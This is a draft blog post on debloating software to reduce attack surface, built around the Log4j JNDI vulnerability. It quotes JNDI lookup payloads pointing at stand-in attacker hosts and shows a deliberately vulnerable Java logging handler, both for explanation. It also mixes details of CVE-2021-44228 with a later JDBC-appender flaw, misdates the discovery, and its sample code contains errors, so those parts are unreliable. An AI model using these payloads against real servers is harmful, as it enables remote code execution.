---
layout: post
title: Why Debloating Software Based on Client's Usages?
subtitle: The case of the Log4j vulnerability
tags: security
description: TODO
keywords:
  - debloating,
  - log4j,
  - security,
  - vulnerabilities,
  - software engineering
image: ../img/posts/2022/2022-06-15/satyr-cover.jpg
share-img: ../img/posts/2022/2022-06-15/satyr-cover.jpg
show-avatar: false
toc: true
date: 2022/06/15
author: cesarsotovalero
published: false
---

Most software applications are built using third-party libraries and frameworks that together form the application's [software supply chain](../blog/the-software-supply-chain.html).
These libraries are often large and complex pieces of engineering, with many features and functionalities to support a wide range of use cases.
Consequently, most applications only use a small subset of these features.
This means that the majority of the code in these libraries is unnecessary for the application's functionality.
This excess of code can be a security risk, as it can contain dormant vulnerabilities that can be exploited.
This article explores the benefits of [debloating software based on user usage](../blog/diversity-driven-software-debloat.html), and how it can help reduce the attack surface of applications.
With a focus on the recent log4j security vulnerability, let's discuss how debloating could have mitigated the impact of such incident.

<figure class="jb_picture">
  {% responsive_image path: img/posts/2022/2022-06-15/satyr.jpg alt:"TODO" %}
  <figcaption class="stroke"> 
    &#169; Let's reuse code, sit, sing, and hope for the best. Photo from a wooden satyr in <a href="https://goo.gl/maps/EjhcQKd9rBBfUTu48">Stockholm City Museum</a>.
  </figcaption>
</figure>

# The Log4j Vulnerability

In December 29th 2021, a critical vulnerability was discovered in the popular Java logging library log4j2.
An attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code.
The versions affected ranged [between 2.0-beta9 and 2.14.1 included](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q). 
This vulnerability is identified by [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).


The vulnerability stemmed from the `JndiLookup` class in log4j, which allowed JNDI ([Java Naming and Directory Interface](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html#:~:text=The%20Java%20Naming%20and%20Directory,any%20specific%20directory%20service%20implementation.)) lookups. 
When log4j is configured to log unsanitized user input, an attacker can insert a malicious string (like `${jndi:ldap://malicious.server/payload}`) which would cause log4j to initiate a JNDI lookup.
This can lead to Remote Code Execution (RCE) because certain JNDI services, like LDAP, can return serialized Java objects, allowing the attacker to run arbitrary code on the affected server.

> The Java Naming and Directory Interface (JNDI) is an API that allows applications to discover and look up data and objects via a name. These objects can be anything from simple data items (like strings and numbers) to more complex network services. JNDI lookup is essentially the process of retrieving an object or piece of data bound to a particular name in a naming or directory service.

The attack works as follows:

1. The user sends data to the server (TCP, HTTP, or any other protocol allowing this).
2. The server writes in the logs via log4j the data containing the malicious payload in the request: `${jndi:ldap://malicioussite.com/exploit}`, where `malicioussite.com` is an attacker-controlled server.
3. The log4j vulnerability is triggered and the server makes a request to `malicioussite.com` via JNDI.
4. The response contains a path to a remote Java class file, which will be injected into the server process.
5. The injected payload allows the presumed attacker to execute arbitrary code.


The following code represents a scenario where an attacker can exploit this vulnerability via the User Agent header of an HTTP request:

```java
/**
* A simple HTTP handler that will process HTTP requests and logs it back.
*/
public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = Logger.getLogger(log4jExample.class.getName());

  /**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * @param he HTTP Request Object
   */
  public void handle(HttpExchange he) throws IOException {
    // The User Agent from the HTTP request is retrieved and stored in the userAgent variable.
    string userAgent = he.getRequestHeader("user-agent");
    // Logging the User Agent, this is where the exploit occurs.
    // If an attacker sends a malicious payload like ${jndi:ldap://attacker.com/a} as the User Agent,
    // log4j will try to resolve this expression, leading to a remote code execution (RCE) vulnerability.
    log.info("Request User Agent:" + userAgent);
    // A response is then generated, echoing back the User Agent within an HTML message and a 200 OK status.
    String response = "<h1>Hello There, " + userAgent + "!</h1>";
    he.sendResponseHeaders(200, response.length());
    OutputStream os = he.getResponseBody();
    os.write(response.getBytes());
    os.close();
  }
}
```

Because log4j is ubiquitously used in Java applications, this vulnerability was particularly alarming.
The impact was widespread, affecting countless systems, and required immediate patching. 
A patch (2.15.0) was swiftly released by the Apache Logging team that removed the vulnerable feature, and many organizations rushed to update their log4j versions or implement mitigations like JVM flags or firewall rules.

<figure class="jb_picture">
  {% responsive_image path: img/posts/2022/2022-06-15/log4j_attack.png alt:"The log4j JNDI attack and how to prevent it." %}
  <figcaption class="stroke"> 
    Fig 1. The log4j JNDI attack (in black) and how to prevent it (in red). Image source: <a href="https://www.govcert.admin.ch/">Swiss Government Computer Emergency Response Team</a>.
  </figcaption>
</figure>

Apart from the direct RCE exploit, this vulnerability also opened up doors to other attack vectors like Denial of Service (DoS) via extremely resource-intensive JNDI lookups, or Information Disclosure as the malicious server can capture IP addresses of the servers making the lookup.

This incident also highlighted the importance of being cautious when parsing and logging untrusted input, and emphasized the need for regular security reviews of even well-established and trusted libraries in the software ecosystem.

# Does Debloating Helps?

The log4j vulnerability brought to light the dangers of excess code and features in widely used libraries. 
A library as pervasive as log4j having a critical flaw suggests that even well-maintained codebases can contain dormant vulnerabilities, especially in rarely used features. 
This incident underscores the importance of debloating—reducing the codebase by removing or disabling code not necessary for a particular application's functionality.

Software debloating allows organizations to reduce the attack surface of their applications by removing unnecessary features and components.
Reduced codebase means a reduced attack surface.
If parts of a library or software aren't present, they can't be exploited.
Based on thi premise, fewer components and lines of code in a software product can lead to fewer vulnerabilities.
This reduction in vulnerabilities arises because there are fewer points for an attacker to target.

In the case of log4j, the vulnerability stemmed from a particular feature related to the `JndiLookup` class that permitted JNDI (Java Naming and Directory Interface) lookups.
This feature was exploited in the vulnerability for remote code execution by sending specifically crafted inputs that the library would process.

Many applications that used log4j didn't even require the `JndiLookup` functionality or the ability to process JNDI lookups. 
However, since this feature was present in the library, and the library was integrated into their applications, they became vulnerable.
If this feature had been removed or wasn't a part of the version of the library they were using, the vulnerability would have had no impact on them, even if the flaw still existed in the code of the broader log4j project.

Where an upgrade is not immediately possible, an alternative mitigation option is to remove the JndiLookup class from the classpath.
If an organization had debloated their version of log4j, removing features and components they didn't use, including the `JndiLookup` class, they would have naturally been immune to this particular vulnerability.
This example underscores the principle that removing or disabling unnecessary components can reduce the potential points of failure or exploitation in software.

# Software Debloating Strategies

1. **Static Analysis-Based Debloating:**
  - **Principle**: Analyze the software without executing it.
  - **Example**: Using tools like ProGuard for Java, which can identify and remove unused classes, fields, methods, and attributes based on the application's usage. Considering log4j, if an application only uses certain logging functionalities, a static analysis tool might prune away the unused features, potentially including the problematic `JndiLookup` class.
  - **Advantages**: No need to run the software, usually faster than dynamic analysis, can be integrated into build processes.
  - **Challenges**: Over-approximation might lead to removing code that's actually needed or under-approximation might leave more code than necessary.

2. **Dynamic Analysis-Based Debloating:**
  - **Principle**: Analyze the software by executing it, typically under various scenarios.
  - **Example**: Profiling a Java application during its runtime to see which methods of a library like log4j are invoked and which aren't. If certain methods are never called across various representative runs, they can be considered for removal.
  - **Advantages**: More accurate than static analysis since it's based on real execution patterns.
  - **Challenges**: Need representative workloads or usage scenarios. Might miss some code paths that are only invoked in rare situations.

3. **Profile-Guided Debloating:**
  - **Principle**: Combines both static and dynamic analysis. Software is first profiled (dynamic analysis) to collect data on which parts are most used, then that data guides static debloating processes.
  - **Example**: Running an application server under peak loads to gather profile data, and then passing that data to a tool that prunes unused parts of libraries like log4j.
  - **Advantages**: Combines the accuracy of dynamic analysis with the thoroughness of static tools.
  - **Challenges**: More complex, needs both runtime profiling and post-profiling analysis stages.

# Conclusion

While debloating can offer significant advantages, it's essential to ensure that the software still behaves correctly after the debloating process. Rigorous testing is crucial. The log4j vulnerability offers a poignant lesson on the latent dangers in extraneous code and features. In our increasingly security-conscious world, code debloating based on user usage might shift from being an optimization strategy to a critical security measure.

In conclusion, the log4j incident serves as a compelling illustration of the statement's validity.
It emphasizes the security benefits of minimizing code and features to only what is necessary for a given application or service, thereby reducing the overall risk profile.


# References

- [Vulnerability Affecting Multiple Log4j Versions Permits RCE Exploit](https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html#fixed-in-log4j-2-15-0-java-8)
- [Zero-Day Exploit Targeting Popular Java Library Log4j](https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)


